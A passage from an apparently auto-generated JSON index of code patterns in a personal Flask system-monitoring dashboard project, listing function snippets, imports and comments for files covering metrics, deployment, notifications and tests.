    "project": "/Volumes/Movies/Mac Mini External/MemoryCore_backup_20250907_151607/docs/dashboard",
    "name": "dashboard",
    "languages": [
      "Python",
      "JavaScript"
    ],
    "python_patterns": [
      {
        "file": "/Volumes/Movies/Mac Mini External/MemoryCore_backup_20250907_151607/docs/dashboard/__init__.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [],
        "imports": [],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/MemoryCore_backup_20250907_151607/docs/dashboard/app.py",
        "docstrings": [],
        "function_defs": [
          "def generate_metrics():\n\"\"\"Generate current system metrics.\"\"\"\ntry:\nmem = psutil.virtual_memory()\ndisk = psutil.disk_usage('/')\nnet_io = psutil.net_io_counters(pernic=True)\nreturn {\n'cpu_percent': psutil.cpu_percent(interval=1),\n'memory_percent': mem.percent,\n'disk_percent': disk.percent,",
          "def send_metrics():\n\"\"\"SSE event generator.\"\"\"\ntry:\nwhile True:\nmetrics = generate_metrics()\nyield f\"data: {json.dumps(metrics)}\\n\\n\"\nsleep(2)  # Update every 2 seconds\nexcept GeneratorExit:\npass\n",
          "def healthz():\n\"\"\"Health check endpoint.\"\"\"\ntry:\n# Basic system checks\npsutil.cpu_percent()\npsutil.virtual_memory()\npsutil.disk_usage('/')\nreturn jsonify({\n'status': 'healthy',\n'timestamp': datetime.now().isoformat()",
          "def get_system_stats():\n\"\"\"Get comprehensive system statistics.\"\"\"\ntry:\nstats = {\n\"video_processing\": get_video_processing_stats(),\n\"file_mover\": get_file_mover_stats(),\n\"ssh_tunnel\": get_ssh_tunnel_stats(),\n\"events\": get_recent_events()\n}\nreturn jsonify(stats)",
          "def get_video_processing_stats():\n\"\"\"Get video processing statistics.\"\"\"\ntry:\n# Connect to PersonalAssistant SQLite database\ndb_path = Path(\"/Volumes/Mac Mini External/video_enhancer/PersonalAssistant/data.db\")\nif not db_path.exists():\nreturn {\"status\": \"database not found\"}\n\nconn = sqlite3.connect(str(db_path))\ncursor = conn.cursor()",
          "def get_file_mover_stats():\n\"\"\"Get file mover statistics.\"\"\"\ntry:\nbase_path = Path(\"/Volumes/Mac Mini External/MemoryCore\")\n\n# Read hash index\nhash_index = {}\nhash_index_path = base_path / \"hash_index.json\"\nif hash_index_path.exists():\nwith open(hash_index_path) as f:",
          "def get_ssh_tunnel_stats():\n\"\"\"Get SSH tunnel statistics.\"\"\"\ntry:\n# Check tunnel process\nps = subprocess.run(\n[\"ps\", \"aux\"],\ncapture_output=True,\ntext=True\n)\ntunnel_running = \"ssh.*reverse.*tunnel\" in ps.stdout",
          "def get_recent_events():\n\"\"\"Get recent events across all systems.\"\"\"\nevents = []\n\ntry:\n# Check video processing events\ndb_path = Path(\"/Volumes/Mac Mini External/video_enhancer/PersonalAssistant/data.db\")\nif db_path.exists():\nconn = sqlite3.connect(str(db_path))\ncursor = conn.cursor()",
          "def events():\n\"\"\"SSE endpoint for live metrics.\"\"\"\nreturn Response(\nsend_metrics(),\nmimetype='text/event-stream',\nheaders={\n'Cache-Control': 'no-cache',\n'Connection': 'keep-alive',\n'X-Accel-Buffering': 'no'\n}",
          "def format_bytes(bytes):\n\"\"\"Format bytes to human readable string.\"\"\"\nfor unit in ['B', 'KB', 'MB', 'GB', 'TB']:\nif bytes < 1024:\nreturn f\"{bytes:.1f}{unit}\"\nbytes /= 1024\nreturn f\"{bytes:.1f}TB\"\n\n@app.route('/')\ndef index():",
          "def index():\n\"\"\"Dashboard home page.\"\"\"\ntry:\nmem = psutil.virtual_memory()\ndisk = psutil.disk_usage('/')\n\n# Count running processes safely\nrunning_processes = 0\ntry:\nfor proc in psutil.process_iter(['status']):",
          "def status():\n\"\"\"Get rich system status data.\"\"\"\ntry:\n# Get CPU metrics safely\ntry:\ncpu_metrics = psutil.cpu_percent(interval=1, percpu=True)\nexcept Exception:\ncpu_metrics = [0.0]\n\n# Get process metrics safely"
        ],
        "class_defs": [],
        "imports": [
          "import os",
          "import psutil",
          "import json",
          "import sqlite3",
          "from datetime import datetime, timedelta",
          "from pathlib import Path",
          "from flask import Flask, request, jsonify, render_template, session, redirect, url_for, Response",
          "from flask_cors import CORS",
          "from threading import Lock",
          "from time import sleep",
          "from queue import Queue",
          "import subprocess"
        ],
        "comments": [
          "# Initialize Flask application",
          "# Global state for SSE",
          "# Basic system checks",
          "# Connect to PersonalAssistant SQLite database",
          "# Get processing statistics",
          "# Get active tasks",
          "# Read hash index",
          "# Count conflicts",
          "# Get recent movements from ledger",
          "# Check tunnel process",
          "# Check API endpoint",
          "# Check video processing events",
          "# Check file mover events",
          "# Count running processes safely",
          "# Get network metrics safely",
          "# Get CPU metrics safely",
          "# Get process metrics safely",
          "# Get disk metrics safely",
          "# Get network metrics safely"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 1,
        "error_handling": 36,
        "decorators": [
          "@app.route('/healthz')",
          "@app.route('/api/stats')",
          "@app.route('/events')",
          "@app.route('/')",
          "@app.route('/api/status')"
        ]
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/MemoryCore_backup_20250907_151607/docs/dashboard/deploy.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, base_path: str):",
          "def _load_config(self) -> Dict[str, Any]:\n\"\"\"Load deployment configuration.\"\"\"\nconfig = {\n'production': {\n'host': os.getenv('DEPLOY_HOST', 'localhost'),\n'port': int(os.getenv('DEPLOY_PORT', 8000)),\n'api_key': os.getenv('DEPLOY_KEY'),\n'backup_retention_days': 7\n},\n'staging': {",
          "def create_backup(self, env: str) -> str:\n\"\"\"Create backup of current deployment.\"\"\"\nlogger.info(f\"Creating backup for {env} environment\")\n\ntimestamp = datetime.now().strftime('%Y%m%d_%H%M%S')\nbackup_path = self.backup_dir / f\"backup_{env}_{timestamp}.tar.gz\"\n\ntry:\n# Create backup archive\nsubprocess.run([",
          "def _get_git_commit(self) -> str:\n\"\"\"Get current git commit hash.\"\"\"\ntry:\nresult = subprocess.run(\n['git', 'rev-parse', 'HEAD'],\ncwd=str(self.base_path),\ncapture_output=True,\ntext=True\n)\nreturn result.stdout.strip()",
          "def _get_backup_manifest(self) -> Dict[str, Any]:\n\"\"\"Create manifest of backed up files.\"\"\"\nmanifest = {'files': [], 'total_size': 0}\n\nfor path in ['src', 'static', 'templates']:\ndir_path = self.base_path / path\nif dir_path.exists():\nfor file in dir_path.rglob('*'):\nif file.is_file():\nrel_path = file.relative_to(self.base_path)",
          "def deploy(self, env: str):\n\"\"\"Deploy the dashboard to specified environment.\"\"\"\nlogger.info(f\"Starting deployment to {env}\")\n\ntry:\n# Create backup first\nbackup_path = self.create_backup(env)\n\n# Deploy steps\nself._copy_files(env)",
          "def _copy_files(self, env: str):\n\"\"\"Copy files to deployment location.\"\"\"\nconfig = self.config[env]\n\nif env == 'production':\n# Use rsync for remote deployment\nsubprocess.run([\n'rsync',\n'-av',\n'--delete',",
          "def _update_config(self, env: str):\n\"\"\"Update configuration for environment.\"\"\"\nconfig = self.config[env]\n\nconfig_file = self.base_path / f\"config_{env}.json\"\nif config_file.exists():\nif env == 'production':\nsubprocess.run([\n'scp',\nstr(config_file),",
          "def _run_migrations(self, env: str):\n\"\"\"Run any necessary migrations.\"\"\"\nconfig = self.config[env]\n\nif env == 'production':\nsubprocess.run([\n'ssh',\nconfig['host'],\n'cd /opt/dashboard && python3 src/db/migrate.py'\n], check=True)",
          "def _restart_services(self, env: str):\n\"\"\"Restart application services.\"\"\"\nconfig = self.config[env]\n\nif env == 'production':\nsubprocess.run([\n'ssh',\nconfig['host'],\n'sudo systemctl restart dashboard'\n], check=True)",
          "def _record_deployment(self, env: str, backup_path: str):\n\"\"\"Record deployment details.\"\"\"\nrecord = {\n'timestamp': datetime.now().isoformat(),\n'environment': env,\n'git_commit': self._get_git_commit(),\n'backup_path': backup_path,\n'deployer': os.getenv('USER', 'unknown')\n}\n",
          "def verify(self, env: str) -> bool:\n\"\"\"Verify deployment health.\"\"\"\nconfig = self.config[env]\n\ntry:\n# Check service status\nif env == 'production':\nresult = subprocess.run([\n'ssh',\nconfig['host'],",
          "def rollback(self, env: str):\n\"\"\"Roll back to previous deployment.\"\"\"\nlogger.info(f\"Rolling back {env} deployment\")\n\ntry:\n# Find latest backup\nbackups = sorted(\nself.backup_dir.glob(f\"backup_{env}_*.tar.gz\"),\nkey=lambda x: x.stat().st_mtime,\nreverse=True",
          "def cleanup_old_backups(self, env: str):\n\"\"\"Clean up old backup files.\"\"\"\nconfig = self.config[env]\nretention_days = config['backup_retention_days']\ncutoff_time = time.time() - (retention_days * 86400)\n\nfor backup in self.backup_dir.glob(f\"backup_{env}_*.tar.gz\"):\nif backup.stat().st_mtime < cutoff_time:\nlogger.info(f\"Removing old backup: {backup}\")\nbackup.unlink()",
          "def main():\n\"\"\"Run deployment operations based on command line arguments.\"\"\"\nparser = argparse.ArgumentParser(description='Dashboard deployment tool')\nparser.add_argument(\n'--env',\nchoices=['production', 'staging'],\ndefault='staging',\nhelp='Deployment environment'\n)\nparser.add_argument("
        ],
        "class_defs": [
          "class Deployer:"
        ],
        "imports": [
          "import os",
          "import sys",
          "import subprocess",
          "import argparse",
          "import logging",
          "import json",
          "import time",
          "from pathlib import Path",
          "from datetime import datetime",
          "import requests",
          "from typing import Dict, Any, Optional"
        ],
        "comments": [
          "# Ensure directories exist",
          "# Load environment config",
          "# Create backup archive",
          "# Record backup metadata",
          "# Create backup first",
          "# Deploy steps",
          "# Record deployment",
          "# Use rsync for remote deployment",
          "# Local deployment",
          "# Check service status",
          "# Check API health",
          "# Find latest backup",
          "# Extract backup",
          "# Restart services",
          "# Verify rollback",
          "# Remove metadata file if it exists"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 14,
        "decorators": []
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/MemoryCore_backup_20250907_151607/docs/dashboard/dev_controller.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self):",
          "def setup_logging(self):"
        ],
        "class_defs": [
          "class DevelopmentController:"
        ],
        "imports": [
          "import asyncio",
          "import logging",
          "import json",
          "import subprocess",
          "from datetime import datetime, timedelta",
          "from pathlib import Path",
          "from typing import Dict, List"
        ],
        "comments": [
          "# Check cycle time",
          "# Start new cycle",
          "# Run parallel development tracks",
          "# Monitor and adjust",
          "# Save current state",
          "# Reset active tasks",
          "# Plan next cycle",
          "# Check task completion",
          "# Adjust resources based on progress",
          "# Monitor system resources",
          "# Adjust thread allocation",
          "# Balance workload",
          "# Analyze previous cycle",
          "# Adjust priorities",
          "# Update phase targets"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 18,
        "decorators": []
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/MemoryCore_backup_20250907_151607/docs/dashboard/flask_test.py",
        "docstrings": [],
        "function_defs": [
          "def test():"
        ],
        "class_defs": [],
        "imports": [
          "from flask import Flask",
          "import logging"
        ],
        "comments": [
          "# Configure logging"
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": [
          "@app.route('/test')"
        ]
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/MemoryCore_backup_20250907_151607/docs/dashboard/generate_status.py",
        "docstrings": [],
        "function_defs": [
          "def get_system_status() -> Dict:\n\"\"\"Get comprehensive system status including metrics and state.\"\"\"\ntry:\nmetrics = system_metrics.get_all_metrics()\nstatus = 'healthy'\nissues = []\nif metrics['cpu'].get('percent', 0) > 80:\nissues.append(f\"High CPU usage: {metrics['cpu']['percent']}%\")\nstatus = 'warning'\nif metrics['memory'].get('virtual', {}).get('percent', 0) > 80:",
          "def get_memorycore_stats():\n\"\"\"Get MemoryCore specific statistics.\"\"\"\nbase_path = Path('/Volumes/Mac Mini External/MemoryCore')\nstats = {'total_files': 0, 'total_size': 0, 'categories': {}, 'recent_changes': []}\nfor category in ['docs', 'scripts', 'data', 'models']:\ncat_path = base_path / category\nif cat_path.exists():\nfiles = list(cat_path.rglob('*'))\nfile_count = len([f for f in files if f.is_file()])\ntotal_size = sum((f.stat().st_size for f in files if f.is_file()))",
          "def get_recent_events():\n\"\"\"Get most recent events from timeline data and other sources.\"\"\"\nevents = []\nenriched_path = Path('/Volumes/Mac Mini External/MemoryCore/docs/dashboard/data/timeline/timeline_enriched.json')\nraw_path = Path('/Volumes/Mac Mini External/MemoryCore/docs/dashboard/data/timeline/timeline_data.json')\ntimeline_path = enriched_path if enriched_path.exists() else raw_path\nif timeline_path.exists():\ntry:\nwith open(timeline_path) as f:\ndata = json.load(f)",
          "def get_project_narrative():\n\"\"\"Get project narrative data.\"\"\"\nnarrative_path = Path('/Volumes/Mac Mini External/MemoryCore/docs/dashboard/data/narrative/project_narrative.json')\nif narrative_path.exists():\ntry:\nwith open(narrative_path) as f:\nreturn json.load(f)\nexcept Exception as e:\nlogging.error(f'Error loading narrative: {e}')\nreturn None",
          "def get_system_timeline():\n\"\"\"Get system evolution timeline.\"\"\"\ntimeline_path = Path('/Volumes/Mac Mini External/MemoryCore/docs/dashboard/data/timeline/system_timeline.json')\nif timeline_path.exists():\ntry:\nwith open(timeline_path) as f:\nreturn json.load(f)\nexcept Exception as e:\nlogging.error(f'Error loading timeline: {e}')\nreturn None",
          "def format_timeline_entry(event):\n\"\"\"Format a timeline entry for display.\"\"\"\ndate = datetime.fromisoformat(event['date'].replace('Z', '+00:00'))\nformatted_date = date.strftime('%Y-%m-%d %H:%M:%S')\ndetails = event.get('details', {})\ndetails_html = ''\nfor key, value in details.items():\nif value and str(value).strip():\ndetails_html += f\"<div class='detail'><span class='key'>{key}:</span> {value}</div>\"\nreturn f\"\\n    <div class='timeline-entry {event['type']}'>\\n        <div class='timeline-date'>{formatted_date}</div>\\n        <div class='timeline-type'>{event['type']}</div>\\n        <div class='timeline-component'>{event['component']}</div>\\n        <div class='timeline-details'>{details_html}</div>\\n    </div>\\n    \"",
          "def format_project_phase(phase):\n\"\"\"Format a project phase for display.\"\"\"\nreturn f\"\\n    <div class='phase-entry'>\\n        <div class='phase-description'>{phase['description']}</div>\\n        <div class='phase-context'>{phase['context']}</div>\\n        <div class='phase-source'>Source: {phase['source_file']}</div>\\n    </div>\\n    \"\n\ndef format_project_status(status):\n\"\"\"Format project status for display.\"\"\"",
          "def format_project_status(status):\n\"\"\"Format project status for display.\"\"\"\nhtml = \"<div class='project-status'>\"\nif 'containers' in status:\nhtml += '<h4>Containers:</h4><ul>'\nfor container, state in status['containers'].items():\nhtml += f\"<li>{container}: <span class='status-{state}'>{state}</span></li>\"\nhtml += '</ul>'\nif 'services' in status:\nhtml += '<h4>Services:</h4><ul>'",
          "def generate_network_section(network_metrics: Dict) -> str:\n\"\"\"Generate HTML for network metrics section with error handling.\"\"\"\ntry:\nhtml_parts = []\nif 'connections' in network_metrics:\nconnections = network_metrics['connections']\nhtml_parts.append(f\"<div>Total Connections: {connections.get('total', 0)}</div>\")\nif 'by_status' in connections:\nstates = [f'{state}: {count}' for state, count in connections['by_status'].items()]\nif states:",
          "def format_project_roadmap(roadmap):\n\"\"\"Format project roadmap for display.\"\"\"\nhtml = \"<div class='project-roadmap'>\"\nfor item in roadmap:\nif item['type'] == 'goals':\nhtml += '<h4>Pending Goals:</h4><ul>'\nfor goal in item['items']:\nhtml += f\"<li class='priority-{item['priority']}'>{goal}</li>\"\nhtml += '</ul>'\nelif item['type'] == 'next_phase':",
          "def generate_timeline_section(timeline_data: Optional[Dict]) -> str:\n\"\"\"Generate the timeline section HTML.\"\"\"\nif not timeline_data:\nreturn ''\nhtml = \"<div class='timeline'>\"\nhtml += \"\\n        <nav class='timeline-nav'>\\n            <div class='timeline-filters'>\\n                <button class='timeline-filter active' data-filter='all'>All</button>\\n                <button class='timeline-filter' data-filter='infrastructure'>Infrastructure</button>\\n                <button class='timeline-filter' data-filter='development'>Development</button>\\n                <button class='timeline-filter' data-filter='integration'>Integration</button>\\n                <button class='timeline-filter' data-filter='automation'>Automation</button>\\n            </div>\\n        </nav>\\n    \"\nif 'summary' in timeline_data and 'statistics' in timeline_data['summary']:\nstats = timeline_data['summary']['statistics']\nhtml += \"\\n            <div class='timeline-stats'>\\n                <h3>Timeline Statistics</h3>\\n                <div class='stats-grid'>\\n        \"\nfor category, count in stats.get('by_category', {}).items():",
          "def generate_html():\n\"\"\"Generate a simple HTML status page with error handling.\"\"\"\ntry:\nmetrics = system_metrics.get_all_metrics()\nevents = get_recent_events()\ntimeline_data = get_system_timeline()\nnarrative_data = get_project_narrative()\nprocessed_timeline = None\nif timeline_data:\ntry:",
          "def generate_error_page(error_message: str) -> str:\n\"\"\"Generate a simple error page.\"\"\"\nreturn f'\\n    <html>\\n    <head>\\n        <title>MemoryCore Status - Error</title>\\n        <style>\\n            body {{ font-family: -apple-system, system-ui, sans-serif; margin: 20px; }}\\n            .error {{ color: #f44336; padding: 20px; background: #ffebee; border-radius: 4px; }}\\n        </style>\\n    </head>\\n    <body>\\n        <h1>MemoryCore Status</h1>\\n        <div class=\"error\">\\n            <h2>Error Generating Status Page</h2>\\n            <p>{error_message}</p>\\n        </div>\\n        <script>\\n            setTimeout(() => window.location.reload(), 30000);\\n        </script>\\n    </body>\\n    </html>\\n    '\n\ndef generate_html_content(metrics: Dict, events: List, timeline_data: Optional[Dict], narrative_data: Optional[Dict]) -> str:\n\"\"\"Generate the main HTML content.\"\"\"",
          "def generate_html_content(metrics: Dict, events: List, timeline_data: Optional[Dict], narrative_data: Optional[Dict]) -> str:\n\"\"\"Generate the main HTML content.\"\"\"\nhtml = ''\ntry:\ntimeline_css = ''\ntry:\ncss_path = Path('/Volumes/Mac Mini External/MemoryCore/docs/dashboard/src/templates/timeline.css')\nif css_path.exists():\ntimeline_css = css_path.read_text()\nexcept Exception as e:",
          "def main():\n\"\"\"Generate status page and save it.\"\"\"\ntry:\nhtml = generate_html()\noutput_path = Path('/Volumes/Mac Mini External/MemoryCore/docs/dashboard/index.html')\noutput_path.parent.mkdir(parents=True, exist_ok=True)\nwith open(output_path, 'w') as f:\nf.write(html)\nlogger.info(f'Status page generated successfully at {output_path}')\nexcept Exception as e:"
        ],
        "class_defs": [],
        "imports": [
          "import os",
          "import sys",
          "import json",
          "import logging",
          "from pathlib import Path",
          "from datetime import datetime",
          "from typing import Dict, List, Optional, Union",
          "from logging_config import setup_logging, log_with_context",
          "from metrics_cache import MetricsCache",
          "from system_metrics import SystemMetrics",
          "import sys",
          "from pathlib import Path",
          "from src.processors.timeline_processor import TimelineProcessor"
        ],
        "comments": [],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 5,
        "error_handling": 34,
        "decorators": []
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/MemoryCore_backup_20250907_151607/docs/dashboard/generate_status_improved.py",
        "docstrings": [],
        "function_defs": [
          "def format_html_doc(content: str) -> str:\n\"\"\"Wrap content in a complete HTML document structure.\"\"\"\nreturn f\"\"\"<!DOCTYPE html>",
          "def generate_html_content(metrics: Dict, events: List, timeline_data: Optional[Dict], narrative_data: Optional[Dict]) -> str:\n\"\"\"Generate the main HTML content.\"\"\"\ntry:\n# Build HTML content piece by piece\nparts = []\n\n# Add header\nparts.append(\"\"\""
        ],
        "class_defs": [],
        "imports": [
          "import os",
          "import sys",
          "import json",
          "import logging",
          "from pathlib import Path",
          "from datetime import datetime",
          "from typing import Dict, List, Optional, Union",
          "from logging_config import setup_logging, log_with_context",
          "from metrics_cache import MetricsCache",
          "from system_metrics import SystemMetrics"
        ],
        "comments": [
          "# Initialize components",
          "# Build HTML content piece by piece",
          "# Add header",
          "# Add CSS",
          "# System metrics section",
          "# Network section",
          "# Process section",
          "# Events section",
          "# Projects and timeline section",
          "# Timeline section",
          "# Combine all parts and wrap in HTML structure"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 2,
        "decorators": []
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/MemoryCore_backup_20250907_151607/docs/dashboard/http_test.py",
        "docstrings": [],
        "function_defs": [
          "def _send_response(self, message, status=200):",
          "def do_GET(self):",
          "def run():"
        ],
        "class_defs": [
          "class Handler(BaseHTTPRequestHandler):"
        ],
        "imports": [
          "from http.server import HTTPServer, BaseHTTPRequestHandler",
          "import json"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/MemoryCore_backup_20250907_151607/docs/dashboard/logging_config.py",
        "docstrings": [],
        "function_defs": [
          "def setup_logging():\n\"\"\"Configure logging with rotation and structured format.\"\"\"\n# Create log directory if it doesn't exist\nLOG_DIR.mkdir(parents=True, exist_ok=True)\n\n# Create rotating file handler for debugging\nfile_handler = RotatingFileHandler(\nLOG_FILE,\nmaxBytes=MAX_BYTES,\nbackupCount=BACKUP_COUNT",
          "def log_with_context(logger, level, message, **context):\n\"\"\"\nLog a message with additional context.\n\nArgs:\nlogger: Logger instance\nlevel: Logging level (e.g., INFO, ERROR)\nmessage: Log message\n**context: Additional context as key-value pairs\n\"\"\""
        ],
        "class_defs": [],
        "imports": [
          "import os",
          "import logging",
          "from logging.handlers import RotatingFileHandler",
          "from pathlib import Path"
        ],
        "comments": [
          "# Constants",
          "# Create log directory if it doesn't exist",
          "# Create rotating file handler for debugging",
          "# Create console handler for warnings and errors",
          "# Reset root logger",
          "# Configure root logger",
          "# Create logger for this application",
          "# Add handlers directly to dashboard logger",
          "# Helper function for structured logging",
          "# For errors about common conditions (like access denied), downgrade to warning",
          "# Format context in a cleaner way"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/MemoryCore_backup_20250907_151607/docs/dashboard/metrics_cache.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, ttl_seconds: int = 60):",
          "def get(self, key: str) -> Optional[Any]:\n\"\"\"\nGet a value from cache if it exists and hasn't expired.\n\nArgs:\nkey: Cache key\n\nReturns:\nCached value if valid, None otherwise\n\"\"\"",
          "def set(self, key: str, value: Any) -> None:\n\"\"\"\nSet a value in cache with current timestamp.\n\nArgs:\nkey: Cache key\nvalue: Value to cache\n\"\"\"",
          "def invalidate(self, key: str) -> None:\n\"\"\"\nRemove a key from cache.\n\nArgs:\nkey: Cache key to remove\n\"\"\"",
          "def clear(self) -> None:\n\"\"\"Clear all cached values.\"\"\"\nself.cache.clear()\n\n# Global cache instance\nmetrics_cache = MetricsCache()\n\ndef cached(ttl_seconds: int = 60):\n\"\"\"",
          "def cached(ttl_seconds: int = 60):\n\"\"\"\nDecorator for caching function results.\n\nArgs:\nttl_seconds: Time to live in seconds for cached values\n\nReturns:\nDecorator function\n\"\"\"",
          "def decorator(func):",
          "def wrapper(*args, **kwargs):"
        ],
        "class_defs": [
          "class MetricsCache:"
        ],
        "imports": [
          "import time",
          "from typing import Dict, Any, Optional",
          "from functools import wraps",
          "from datetime import datetime, timedelta"
        ],
        "comments": [
          "# Global cache instance",
          "# Create cache key from function name and arguments",
          "# Check cache first",
          "# If not in cache, compute value"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": [
          "@wraps(func)"
        ]
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/MemoryCore_backup_20250907_151607/docs/dashboard/minimal.py",
        "docstrings": [],
        "function_defs": [
          "def index():"
        ],
        "class_defs": [],
        "imports": [
          "from flask import Flask"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": [
          "@app.route('/')"
        ]
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/MemoryCore_backup_20250907_151607/docs/dashboard/minimal_http.py",
        "docstrings": [],
        "function_defs": [
          "def do_GET(self):"
        ],
        "class_defs": [
          "class Handler(BaseHTTPRequestHandler):"
        ],
        "imports": [
          "from http.server import HTTPServer, BaseHTTPRequestHandler"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/MemoryCore_backup_20250907_151607/docs/dashboard/notify.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self):",
          "def _send_request(self, payload: Dict[str, Any]) -> requests.Response:\n\"\"\"Send request to Pushover API with retry logic\"\"\"\nfor attempt in range(self.retry_attempts):\ntry:\nresponse = requests.post(self.PUSHOVER_API_URL, data=payload)\nresponse.raise_for_status()\nreturn response\nexcept requests.RequestException as e:\nlogger.warning(f'Attempt {attempt + 1} failed: {str(e)}')\nif attempt < self.retry_attempts - 1:",
          "def speak_message(self, message: str, voice: str='Daniel') -> None:\n\"\"\"\nSpeak the message using macOS text-to-speech\n\nArgs:\nmessage: The message to speak\nvoice: The voice to use (default: Daniel)\n\"\"\"",
          "def send_notification(self, message: str, title: Optional[str]=None, priority: str='normal', speak: bool=True, voice: str='Daniel') -> bool:\n\"\"\"\nSend a notification via Pushover\n\nArgs:\nmessage: The message to send\ntitle: Optional title for the notification\npriority: Priority level (lowest, low, normal, high, emergency)\n\nReturns:",
          "def main():"
        ],
        "class_defs": [
          "class PushoverNotifier:"
        ],
        "imports": [
          "import os",
          "import time",
          "import logging",
          "import requests",
          "import argparse",
          "import subprocess",
          "from dotenv import load_dotenv",
          "from typing import Optional, Dict, Any"
        ],
        "comments": [],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 10,
        "decorators": []
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/MemoryCore_backup_20250907_151607/docs/dashboard/run_dashboard.py",
        "docstrings": [],
        "function_defs": [
          "def signal_handler(signum, frame):\n\"\"\"Handle signals gracefully.\"\"\"\nlocal_logger = logging.getLogger('Launcher')\nif flask_process:\nlocal_logger.info(\"Stopping dashboard...\")\nflask_process.terminate()\ntry:\nflask_process.wait(timeout=5)\nexcept subprocess.TimeoutExpired:\nflask_process.kill()",
          "def setup_logging():\n\"\"\"Set up logging.\"\"\"\nlog_dir = Path(__file__).parent / 'logs'\nlog_dir.mkdir(exist_ok=True, parents=True)\n\nlogging.basicConfig(\nlevel=logging.INFO,\nformat='%(asctime)s - %(name)s - %(levelname)s - %(message)s',\nhandlers=[\nlogging.FileHandler(log_dir / 'dashboard.log'),",
          "def check_dependencies():\n\"\"\"Check and install required Python packages.\"\"\"\nrequired_packages = [\n'flask',\n'werkzeug',\n'aiohttp',\n'psutil'\n]\n\nfor package in required_packages:",
          "def main():\n\"\"\"Run the dashboard.\"\"\"\nsetup_logging()\nlogger = logging.getLogger('Launcher')\n\ntry:\n# Check dependencies\ncheck_dependencies()\n\n# Set up environment"
        ],
        "class_defs": [],
        "imports": [
          "import os",
          "import sys",
          "import logging",
          "import subprocess",
          "import signal",
          "from pathlib import Path"
        ],
        "comments": [
          "# Global for the Flask process",
          "# Check dependencies",
          "# Set up environment",
          "# Start Flask application",
          "# Set up signal handlers",
          "# Start Flask process",
          "# Wait for process"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 7,
        "decorators": []
      },
      {
        "file": "/Volumes/Movies/Mac Mini External/MemoryCore_backup_20250907_151607/docs/dashboard/run_tests.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, base_path: str):",
          "def run_tests(self, test_type: Optional[str] = None, parallel: bool = True) -> bool:\n\"\"\"Run tests and generate reports.\"\"\"\nlogger.info(\"Starting test execution...\")\nstart_time = datetime.now()\n\ntry:\n# Build pytest command\ncmd = [\n'pytest',\n'--cache-clear',",
          "def _save_test_results(self, success: bool, duration: timedelta):\n\"\"\"Save test results to file.\"\"\"\nresults = {\n'timestamp': datetime.now().isoformat(),\n'success': success,\n'duration_seconds': duration.total_seconds(),\n'git_commit': self._get_git_commit()\n}\n\nresults_file = self.report_dir / 'test_results.json'",
          "def _get_git_commit(self) -> str:\n\"\"\"Get current git commit hash.\"\"\"\ntry:\nresult = subprocess.run(\n['git', 'rev-parse', 'HEAD'],\ncwd=str(self.base_path),\ncapture_output=True,\ntext=True\n)\nreturn result.stdout.strip()",
          "def _notify_test_completion(self, success: bool, duration: timedelta):\n\"\"\"Notify about test completion.\"\"\"\nstatus = \"PASSED\" if success else \"FAILED\"\nduration_str = str(duration).split('.')[0]  # Remove microseconds\n\nlogger.info(f\"Tests {status} in {duration_str}\")\n\n# Open reports in browser if available\nif self.report_dir.exists():\nreport_path = self.report_dir / 'report.html'",
          "def clean_reports(self):\n\"\"\"Clean old report files.\"\"\"\nif self.report_dir.exists():\nfor item in self.report_dir.iterdir():\nif item.is_file():\nitem.unlink()\n\nif self.coverage_dir.exists():\nfor item in self.coverage_dir.iterdir():\nif item.is_file():",
          "def main():\n\"\"\"Run tests based on command line arguments.\"\"\"\nparser = argparse.ArgumentParser(description='Run dashboard tests')\nparser.add_argument(\n'--type',\nchoices=['all', 'smoke', 'integration'],\ndefault='all',\nhelp='Type of tests to run'\n)\nparser.add_argument("
        ],
        "class_defs": [
          "class TestRunner:"
        ],
        "imports": [
          "import os",
          "import sys",
          "import subprocess",
          "import argparse",
          "import logging",
          "from datetime import datetime",
          "from pathlib import Path",
          "import json",
          "import webbrowser",
          "from typing import List, Optional"
        ],
        "comments": [
          "# Ensure directories exist",
          "# Build pytest command",
          "# Add coverage options",
          "# Add HTML report",
          "# Add test selection if specified",
          "# Add parallel execution if enabled",
          "# Run tests",
          "# Process results",
          "# Open reports in browser if available"
        ],
        "type_hints": true,
